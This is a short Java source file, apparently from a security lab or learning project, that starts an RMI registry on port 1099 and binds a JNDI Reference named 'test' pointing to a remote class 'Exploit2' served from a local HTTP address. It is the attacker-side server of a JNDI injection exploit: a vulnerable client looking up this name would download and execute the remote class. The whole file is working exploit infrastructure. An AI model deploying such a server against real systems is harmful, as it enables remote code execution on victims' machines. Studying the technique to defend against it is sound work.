package JNDI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMITestServer {


    public static void rmiServer(){
//        服务端rmi 版本无所谓
        System.out.println(System.getProperty("java.version"));
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            String remote_class_server = "http://127.0.0.1:8055/";
            Reference reference = new Reference("Exploit2", "Exploit2", remote_class_server);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("test",referenceWrapper);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (NamingException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        }
    }


    public static void main(String[] args) {
//        RMI注册中心
        rmiServer();

    }
}
